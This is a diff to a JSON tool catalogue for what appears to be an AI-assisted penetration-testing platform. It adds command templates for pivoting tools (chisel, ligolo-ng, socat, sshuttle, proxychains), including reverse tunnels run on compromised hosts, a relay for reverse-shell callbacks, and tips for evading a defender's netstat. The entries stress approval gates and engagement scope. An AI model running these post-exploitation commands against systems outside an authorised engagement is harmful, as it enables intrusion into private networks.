@@ -53,7 +53,9 @@
     "<payload>": "A payload: a msfvenom/metasploit payload name or path, or the command, script or implant to run when a persistence mechanism fires.",
     "<name>": "A name/identifier for the object being created (task, service, registry value, unit, shortcut).",
     "<tunnel-zone>": "A DNS zone the OPERATOR controls and has delegated to their own name server — the suffix a DNS tunnel encodes its traffic under. Deliberately not named <domain>: that spelling the composer's target substitution rewrites, and the tunnel's zone is yours, not the target's (same reason as <listener>).",
-    "<tunnel-net>": "The point-to-point address (optionally with a netmask) the OPERATOR assigns to a tunnel interface, e.g. an unused private /27. Not spelled with ip/host for the same reason as <listener>: the tunnel's own network is never the target's."
+    "<tunnel-net>": "The point-to-point address (optionally with a netmask) the OPERATOR assigns to a tunnel interface, e.g. an unused private /27. Not spelled with ip/host for the same reason as <listener>: the tunnel's own network is never the target's.",
+    "<local-port>": "A port on THIS box, bound locally by a forward or relay.",
+    "<socks-port>": "The local SOCKS5 port a pivot exposes on this box (chisel's default is 1080)."
   },
   "tools": [
     {
@@ -4178,6 +4180,243 @@
         {
           "flag": "-NoExit",
           "what": "stay in the console after the command runs"
+        }
+      ]
+    },
+    {
+      "name": "chisel",
+      "category": "pivoting",
+      "purpose": "TCP/UDP tunnel over HTTP, secured with SSH — a single Go binary that is both server and client. The standard way to turn one compromised host into a route: an agent on that host dials back to a server here, and a SOCKS5 proxy appears on this box that proxychains then points at. HackPit already starts chisel listeners through the GATED /cockpit/tunnels endpoint (human-approved, engagement required); this row exists so the planner writes the invocation the same way every time.",
+      "phases": [
+        "post-exploitation"
+      ],
+      "techniques": [
+        "pivoting",
+        "reverse SOCKS proxy",
+        "port forwarding",
+        "T1090.001"
+      ],
+      "docs": "https://github.com/jpillora/chisel",
+      "templates": [
+        {
+          "label": "Reverse SOCKS server (attacker side)",
+          "template": "chisel server -p <listener-port> --reverse --socks5",
+          "note": "Runs HERE and waits. --reverse lets the agent request the forward; --socks5 publishes the SOCKS5 endpoint on 127.0.0.1:1080. This is the exact argv cockpit/tunnels.py builds — start it through /cockpit/tunnels so the listener is tracked and gated, not by hand."
+        },
+        {
+          "label": "Agent side (runs ON the compromised host)",
+          "template": "chisel client <listener>:<listener-port> R:socks",
+          "note": "NOT run here — this is the line you paste into the foothold shell. R: makes it a REVERSE forward, so the pivot host dials out to you and needs no inbound port of its own. <listener> is your callback address, never the target."
+        },
+        {
+          "label": "Agent side — forward one internal service instead of a whole SOCKS proxy",
+          "template": "chisel client <listener>:<listener-port> R:<local-port>:<target>:<ports>",
+          "note": "Quieter than R:socks: exposes exactly one internal service on <local-port> here. Prefer it when you already know the single service you need."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "server",
+          "what": "run as the server (the attacker side)"
+        },
+        {
+          "flag": "client",
+          "what": "run as the agent (the compromised side)"
+        },
+        {
+          "flag": "-p",
+          "what": "port the server listens on"
+        },
+        {
+          "flag": "--reverse",
+          "what": "allow the client to request reverse forwards (R:)"
+        },
+        {
+          "flag": "--socks5",
+          "what": "expose a SOCKS5 endpoint for the reverse tunnel"
+        },
+        {
+          "flag": "--fingerprint",
+          "what": "pin the server key so the agent cannot be MITM'd"
+        }
+      ]
+    },
+    {
+      "name": "ligolo-ng",
+      "aliases": ["ligolo-proxy", "ligolo-agent"],
+      "category": "pivoting",
+      "purpose": "Tunnel that presents the pivoted network as a real TUN INTERFACE rather than a SOCKS proxy — ordinary tools reach it over an OS route with no proxychains wrapper, and protocols SOCKS cannot carry (ICMP, UDP, raw SYN scans) work. ligolo-proxy is the attacker-side console; ligolo-agent runs on the compromised host. HackPit starts the proxy through the GATED /cockpit/tunnels endpoint.",
+      "phases": [
+        "post-exploitation"
+      ],
+      "techniques": [
+        "pivoting",
+        "TUN interface tunnel",
+        "layer-3 pivot",
+        "T1090.001"
+      ],
+      "docs": "https://github.com/nicocha30/ligolo-ng",
+      "templates": [
+        {
+          "label": "Start the proxy (attacker side)",
+          "template": "ligolo-proxy -selfcert -laddr <listener>:<listener-port>",
+          "note": "An INTERACTIVE console — it needs a held stdin, which is why cockpit/lifecycle.py spawns it with `-i`. -selfcert is lab-grade only; on a real engagement pin a certificate instead."
+        },
+        {
+          "label": "Agent side (runs ON the compromised host)",
+          "template": "ligolo-agent -connect <listener>:<listener-port> -ignore-cert",
+          "note": "NOT run here. -ignore-cert pairs with -selfcert above; drop both once you issue a real certificate."
+        },
+        {
+          "label": "Route the pivoted subnet into the TUN interface",
+          "template": "ip route add <cidr> dev <interface>",
+          "note": "The step people forget: without this route nothing reaches the far side. <interface> is the ligolo tun device. Add the same CIDR to the engagement scope via /cockpit/tunnels/scope — the ONLY path that widens scope."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-selfcert",
+          "what": "proxy: generate a self-signed certificate (lab only)"
+        },
+        {
+          "flag": "-laddr",
+          "what": "proxy: address:port the agent connects back to"
+        },
+        {
+          "flag": "-connect",
+          "what": "agent: the proxy address to dial"
+        },
+        {
+          "flag": "-ignore-cert",
+          "what": "agent: accept the proxy's self-signed certificate"
+        }
+      ]
+    },
+    {
+      "name": "socat",
+      "category": "pivoting",
+      "purpose": "Bidirectional byte relay. In a pivot it is the RETURN path: two hops deep the far host cannot reach your box at all, so a relay on the intermediate host gives its callback somewhere local to land and forwards it back to you. Also the plainest way to expose one internal service from a host you already own.",
+      "phases": [
+        "post-exploitation"
+      ],
+      "techniques": [
+        "relay",
+        "port forwarding",
+        "reverse-shell return path",
+        "T1090"
+      ],
+      "docs": "http://www.dest-unreach.org/socat/doc/socat.html",
+      "templates": [
+        {
+          "label": "Relay a callback back to your listener",
+          "template": "socat TCP-LISTEN:<local-port>,fork,reuseaddr TCP:<listener>:<listener-port>",
+          "note": "Runs on the INTERMEDIATE host. The deeper host connects to it on <local-port>; socat forwards to your listener. fork accepts more than one connection; reuseaddr lets you restart without waiting out TIME_WAIT."
+        },
+        {
+          "label": "Expose one internal service from a host you already own",
+          "template": "socat TCP-LISTEN:<local-port>,fork,reuseaddr TCP:<target>:<ports>",
+          "note": "A forward port-forward. It leaves a LISTENING PORT on the compromised host, which a defender's netstat shows — the quiet variant is in the KB entry 'Choosing the Pivot Primitive'."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "TCP-LISTEN:<port>",
+          "what": "bind and accept on this port"
+        },
+        {
+          "flag": "fork",
+          "what": "handle more than one connection instead of exiting"
+        },
+        {
+          "flag": "reuseaddr",
+          "what": "rebind immediately after a restart"
+        },
+        {
+          "flag": "TCP:<host>:<port>",
+          "what": "the far side of the relay"
+        }
+      ]
+    },
+    {
+      "name": "sshuttle",
+      "category": "pivoting",
+      "purpose": "Transparent VPN-over-SSH: forwards whole subnets through an SSH session with no agent on the far host and no proxychains wrapper — it needs only SSH credentials and Python on the pivot. The lowest-effort pivot when you already have SSH; it moves arbitrary traffic into a network, so it demands the same confirm any tunnel does.",
+      "phases": [
+        "post-exploitation"
+      ],
+      "techniques": [
+        "pivoting",
+        "VPN over SSH",
+        "subnet forwarding",
+        "T1090.001"
+      ],
+      "docs": "https://sshuttle.readthedocs.io/",
+      "templates": [
+        {
+          "label": "Forward an internal subnet over an SSH session",
+          "template": "sshuttle -r <user>@<target> <cidr>",
+          "note": "No listener and no uploaded binary — just SSH plus Python on the pivot. Add <cidr> to the engagement scope via /cockpit/tunnels/scope first: routing a subnet you have not scoped is exactly what the scope lock exists to stop."
+        },
+        {
+          "label": "Key-based, excluding the pivot's own address",
+          "template": "sshuttle -r <user>@<target> --ssh-cmd \"ssh -i <keyfile>\" <cidr> -x <target>",
+          "note": "-x excludes the pivot itself; without it the SSH session tries to route through the tunnel it is carrying and the connection dies."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-r",
+          "what": "user@host of the SSH pivot"
+        },
+        {
+          "flag": "--ssh-cmd",
+          "what": "the ssh invocation to use (key, port, options)"
+        },
+        {
+          "flag": "-x",
+          "what": "exclude an address from the tunnel (use it on the pivot itself)"
+        },
+        {
+          "flag": "--dns",
+          "what": "also forward DNS through the pivot"
+        }
+      ]
+    },
+    {
+      "name": "proxychains",
+      "aliases": ["proxychains4"],
+      "category": "pivoting",
+      "purpose": "LD_PRELOAD wrapper that forces another program's TCP connections through a SOCKS proxy — the CONSUMER of a chisel tunnel, not a tunnel itself. It carries no payload of its own, so the red-confirm it deserves is whatever the WRAPPED command deserves: the danger heuristic unwraps it and classifies the inner command instead.",
+      "phases": [
+        "post-exploitation",
+        "enumeration"
+      ],
+      "techniques": [
+        "SOCKS proxying",
+        "pivoted enumeration",
+        "T1090"
+      ],
+      "docs": "https://github.com/rofl0r/proxychains-ng",
+      "templates": [
+        {
+          "label": "Scan through the tunnel",
+          "template": "proxychains -q nmap -sT -Pn -p <ports> <target>",
+          "note": "-sT and -Pn are NOT optional over SOCKS: a SOCKS proxy carries completed TCP connections only, so a SYN scan (-sS) and ICMP host discovery both silently return nothing. -q suppresses proxychains' own per-connection chatter."
+        },
+        {
+          "label": "Reach an internal web service through the tunnel",
+          "template": "proxychains -q curl -s -o <output> <url>",
+          "note": "Point the config at the tunnel's SOCKS port first: `socks5 127.0.0.1 <socks-port>` at the END of /etc/proxychains4.conf. One line PER HOP, and the order of the lines is the order of the chain."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-q",
+          "what": "quiet — suppress the per-connection proxy chatter"
+        },
+        {
+          "flag": "-f",
+          "what": "use a specific config file instead of the default"
         }
       ]
     }
